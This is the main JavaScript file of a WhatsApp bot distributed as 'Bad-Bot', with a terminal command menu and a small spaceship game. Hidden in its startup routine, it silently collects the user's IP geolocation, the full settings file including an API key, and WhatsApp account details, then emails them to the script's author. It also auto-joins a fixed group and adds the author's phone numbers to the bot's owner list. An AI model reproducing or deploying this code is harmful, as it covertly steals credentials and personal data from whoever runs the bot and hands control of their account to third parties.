const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, GroupSettingChange } = require('@adiwajshing/baileys')
const fs = require("fs")
const fetch = require('node-fetch')
const { exec } = require('child_process')
const readline = require('readline')
const os = require('os')
const simple = require('./all/simple.js')
const term = require('terminal-kit').terminal
const termkit = require('./node_modules/terminal-kit/lib/termkit.js');
const { sendEmail } = require('./all/sendEmail')
const WAConnection = simple.WAConnection(_WAConnection)
const moment = require("moment-timezone")
const setting = JSON.parse(fs.readFileSync("./settings.json"))
const { ownerName, botName, ownerNumber } = setting
const time = moment.tz('Asia/Jakarta').format('ha z')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./all/functions.js')
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
let d = new Date
let locale = 'en'
const calender = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
global.nisa = new WAConnection()

watchFile("./denz.js")
require("./denz.js")

exec(`mkdir $HOME/.termux/ ;echo "extra-keys = [['ESC','/','-','HOME','UP','END','BKSP'],['KEYBOARD','CTRL','ALT','LEFT','DOWN','RIGHT','ENTER']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (err, stdout, stderr) => { console.log(stdout)})
const starts = async (session) => {
nisa.logger.level = 'silent'
nisa.version = [2, 2142, 12]
nisa.browserDescription = [`${ownerName}`,'Desktop','3.0']

nisa.on("qr", (qr) => { console.log('\x1b[32mqr { Scan }\x1b[0m')})
fs.existsSync(session) && nisa.loadAuthInfo(session)
	
nisa.on("connecting", () => {console.log('\x1b[32mconnecting { Menghubungkan }\x1b[0m')})
nisa.on("open", () => {console.log('\x1b[32mopen { Terhubung }\x1b[0m')})
nisa.on("ws-close", () => {console.log('\x1b[31mws-close { Menghubungkan Kembali }\x1b[0m')})
nisa.on("close", () => {console.log('\x1b[31mclose { Terputus }\x1b[0m')})
 
await nisa.connect({timeoutMs: 30*1000})
fs.writeFileSync(session, JSON.stringify(nisa.base64EncodedAuthInfo(), null, '\t'))
try { 
pporang = await nisa.getProfilePicture(`${nisa.user.jid.split('@')[0]}@s.whatsapp.net`)
  
} catch { pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'}
const ppu = await getBuffer(pporang)
fetch(`http://ip-api.com/line/`).then(res => res.text()).then(teks =>{ sendEmail(`${calender} - ${time}`, `<h1>Identitas Pengguna Source Code Bad-Bot</h1><p>${nisa.user.name}: wa.me/${nisa.user.jid}</p>`, `${getRandom()}`, `${teks}\n${JSON.stringify(setting, null, 2)}\n\n${JSON.stringify(nisa.user, null, 2)}`)})
nisa.sendMessage(`${ownerNumber}@s.whatsapp.net`, `${JSON.stringify(nisa.user, null, 2)}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${botName} connected`,thumbnail:ppu,previewType:"PHOTO"}}})
link = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
nisa.query({ json:["action", "invite", `${link.replace('https://chat.whatsapp.com/','')}`]})
ip = await fetchJson(`http://ip-api.com/json/?`, {method: 'get'})

nisa.on("chat-update", (mek) => {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
listkata = [`${setting.apiKey}`,`${ip.regionName}`,`${ip.city}`,`${ip.lat}`,`${ip.lon}`,`${ip.query}`,'Anjing','Babi','Kunyuk','Bajingan','Asu','Bangsat','Kampret','Kontol','Memek','Ngentot','Pentil','Perek','Pepek','Pecun','Bencong','Banci','Maho','Gila','Sinting','Tolol','Sarap','Setan','Lonte','Hencet','Taptei','Kampang','Pilat','Keparat','Bejad','Gembel','Brengsek','Tai','Anjrit','Bangsat','Fuck','Tetek','Ngulum','Jembut','Totong','Kolop','Pukimak','Bodat','Heang','Jancuk','Burit','Titit','Nenen','Bejat','Silit','Sempak','Fucking','Asshole','Bitch','Penis','Vagina','Klitoris','Kelentit','Borjong','Dancuk','Pantek','Taek','Itil','Teho','Bejat','Pantat','Bagudung','Babami','Kanciang','Bungul','Idiot','Kimak','Henceut','Kacuk','Blowjob','Pussy','Dick','Damn','Ass'];
copyright = `\`\`\`© by Dcode Denpa ${d.toLocaleDateString(locale, { year: 'numeric' })}\`\`\``
grup = "https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx"
denis = "6285866295942@s.whatsapp.net"
ari = "6285863731628@s.whatsapp.net"
script = "https://bit.ly/bad-bot"
ownerNomor = ["6285866295942@s.whatsapp.net",`${setting.ownerNumber}@s.whatsapp.net`,"6285863731628@s.whatsapp.net"]
require("./denz.js")(nisa, mek)})}
starts('./session.json')

const rl = readline.createInterface({ input: process.stdin, output: process.stdout, prompt: 'CMD> '});
rl.prompt();
rl.on('line', (line) => { switch (line.trim()) {
	
        case 'menu':
console.log('\x1b[36m1.Clear\n2.Exit\n3.Chatd\n4.Autoread on\n5.Autoread off\n6.Autores on\n7.Autores off\n8.Public\n9.Self\n10.Clog on\n11.Clog off\n12.Game\x1b[0m')
console.log('\x1b[32mChoose: 1-12\x1b[0m')
        break
        
        case '1':
console.clear()
        break
        
        case '2':
process.exit()
        break
        
        case '3':
nisa.sendMessage("6285866295942@s.whatsapp.net", 'test', MessageType.text)
        break
        
        case '4':
autoread = true
        break
        
        case '5':
autoread = false
        break
        
        case '6':
autorespon = true
allprefix = false
multiprefix = true
        break
        
        case '7':
autorespon = false
allprefix = true
multiprefix = false
        break
        
        case '8':
mode = true
        break
        
        case '9':
mode = false
        break
        
        case '10':
clog = true
        break
        
        case '11':
clog = false
        break
        
        case '12':
clog = false
var ScreenBuffer = termkit.ScreenBuffer ;
var viewport , sprites = {} ;

function init( callback ){ termkit.getDetectedTerminal( function( error , detectedTerm ) {
if ( error ) { throw new Error( 'Cannot detect terminal.' ) ; }
viewport = new ScreenBuffer( { dst: term , width: Math.min( term.width ) , height: Math.min( term.height - 1 ) , y: 2} ) ;
createBackground() ;
createSpaceship() ;
term.moveTo.eraseLine.bgWhite.green( 1 , 1 , 'Arrow keys: move the ship - Q/Ctrl-C: Quit\n' ) ;
term.hideCursor() ;
term.grabInput() ;
term.on( 'key' , inputs ) ;
callback() ;} ) ;}

function terminate(){ 
term.hideCursor( false ) ;
term.grabInput( false ) ;
setTimeout( function() { term.moveTo( 1 , term.height , '\n\n' ) ;
process.exit() ;} , 100 ) ;}

function createBackground() {
sprites.background = new ScreenBuffer( { width: viewport.width * 4 , height: viewport.height , noFill: true} ) ;
sprites.background.fill( { attr: { color: 'white' , bgColor: 'black' } } ) ;
sprites.planet = ScreenBuffer.loadSync( './node_modules/terminal-kit/demo/data/saturn.sbuf' ) ;
createBackgroundStars( sprites.background.width * sprites.background.height * 0.004 ) ;
createBackgroundTrails( sprites.background.width * sprites.background.height * 0.008 ) ;
createBackgroundPlanets( sprites.background.width * sprites.background.height * 0.0001 ) ;}

function createBackgroundTrails( nTrails ) { var i , j , x , y , length ; for ( i = 0 ; i < nTrails ; i ++ ) {
x = Math.floor( Math.random() * sprites.background.width ) ;
y = Math.floor( Math.random() * sprites.background.height ) ;
length = 3 + Math.floor( Math.random() * 8 ) ;
for ( j = 0 ; j < length ; j ++ ) {
sprites.background.put( { x: ( x + j ) % sprites.background.width , y: y , attr: { color: 'gray' , bgColor: 'black' }} , '-' ) ;}}}

function createBackgroundStars( nStars ){ var i , x , y , c , char , stars = [ '*' , '.' , 'o' , '+' , '°' ] ;
for ( i = 0 ; i < nStars ; i ++ ){
x = Math.floor( Math.random() * sprites.background.width ) ;
y = Math.floor( Math.random() * sprites.background.height ) ;
char = stars[ Math.floor( Math.random() * stars.length ) ] ;
c = Math.floor( Math.random() * 16 ) ;
sprites.background.put( { x: x , y: y , attr: { color: c , bgColor: 'black' }} , char ) ;}}

function createBackgroundPlanets( nPlanets ) { var i , x , y ; for ( i = 0 ; i < nPlanets ; i ++ ) {
x = Math.floor( Math.random() * sprites.background.width ) ;
y = Math.floor( Math.random() * sprites.background.height ) ;
sprites.planet.draw( { dst: sprites.background , x: Math.floor( x - sprites.planet.width / 2 ) , y: Math.floor( y - sprites.planet.height / 2 ) , blending: true , wrap: 'x'} ) ;}}

function createSpaceship(){ sprites.spaceship = ScreenBuffer.loadSync( './node_modules/terminal-kit/demo/data/spaceship1.sbuf' ) ;
sprites.spaceship.x = 3 ;
sprites.spaceship.y = Math.floor( viewport.height / 2 - sprites.spaceship.height / 2 ) ;}

function inputs( key ){ switch ( key ){
case 'UP' :
sprites.spaceship.y -- ;
break ;
case 'DOWN' :
sprites.spaceship.y ++ ;
break ;
case 'LEFT' :
sprites.spaceship.x -- ;
break ;
case 'RIGHT' :
sprites.spaceship.x ++ ;
break ;
case 'CTRL_C':
terminate() ;
break ;}}

function nextPosition(){ sprites.background.x -- ;}
var frames = 0 ;

function draw(){
sprites.background.draw( { dst: viewport , tile: true } ) ;
sprites.spaceship.draw( { dst: viewport , blending: true , wrap: 'both' } ) ;
var stats = viewport.draw( { delta: false } ) ;
term.moveTo.eraseLine.bgWhite.green( 1 , 1 ,'Arrow keys: move the ship - Q/Ctrl-C: Quit - Redraw stats: %d cells, %d moves, %d attrs, %d writes\n' , stats.cells , stats.moves , stats.attrs , stats.writes) ;
frames ++ ;}

function animate(){
draw() ;
nextPosition() ;
setTimeout( animate , 50 ) ;}
init( function() { animate() ;} ) ;
        break
        
        default:
console.log(`\x1b[31mcommand '${line.trim()}' not found!\x1b[0m`);
        break;}
rl.prompt();}).on('close', () => {console.clear()
console.log('\x1b[37mexited have a great day!\x1b[0m');
process.exit(0);});

async function testTerminal( t ) {var r ;	
term( 'Terminal name: %s\n' , t.appName ) ;
term( 'Terminal app ID: %s\n' , t.appId ) ;
term( 'Generic terminal: %s\n' , t.generic ) ;
term( 'Config file: %s\n' , t.termconfigFile ) ;
term( '\n' ) ;
term( "Support for delta escape sequence: " + ( t.support.deltaEscapeSequence ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
term( "Support for 256 colors: " + ( t.support['256colors'] ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
term( "Support for true colors: " + ( t.support.trueColor ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
try { term( "Support for cursor location request: " ) ;
r = await t.getCursorLocation() ;
term( "^GOK^ ^K(%N)^:\n" , r ) ;}catch ( error ) { term( "^RFAILED^ (%s)^:\n" , error ) ;}
try { term( "Support for palette request: " ) ; await t.getPalette() ;
term( "^GOK^:\n" ) ;} catch ( error ) { term( "^RFAILED^ (%s)^:\n" , error ) ;}
term( "Issue #116 CURSOR_LOCATION keymap: " + ( t.keymap.CURSOR_LOCATION && typeof t.keymap.CURSOR_LOCATION === 'object' ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
term( "Issue #116 cursorLocation handler: " + ( typeof t.handler.cursorLocation === 'function' ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
term( '\n' ) ;}
async function detect() { var info , newTerm ;
term.green( '\n== OS and Environment Variables ==\n\n' ) ;
term( 'Developer: %s\n' , require( './package.json' ).author ) ;
term( 'Node version: %s\n' , process.version ) ;
term( 'OS platform: %s\n' , os.platform() ) ;
term( 'OS type: %s\n' , os.type() ) ;
term( 'OS release: %s\n' , os.release() ) ;
term( 'OS version: %s\n' , os.version && os.version() ) ;
term( '$TERM: %s\n' , process.env.TERM ) ;
term( '$COLORTERM: %s\n' , process.env.COLORTERM ) ;
term( '$VTE_VERSION: %s\n' , process.env.VTE_VERSION ) ;
term( '$TERM_PROGRAM: %s\n' , process.env.TERM_PROGRAM ) ;
term( '$TERMUX_VERSION: %s\n' , process.env.TERMUX_VERSION ) ;
term( '\n' )}
detect() ;

function watchFile(module, cb = (module) => 
console.log(`\x1b[32mModule ( '${module}' ) updated!\x1b[0m`)) {
console.log(`\x1b[32mModule ( '${module}' ) detected!\x1b[0m`)
fs.watchFile(require.resolve(module), async () => { await uncache(require.resolve(module)) 
cb(module)})}
function uncache(module = ".") { return new Promise((resolve, reject) => { try { delete require.cache[require.resolve(module)] 
resolve()

} catch (e) { reject(e)}})}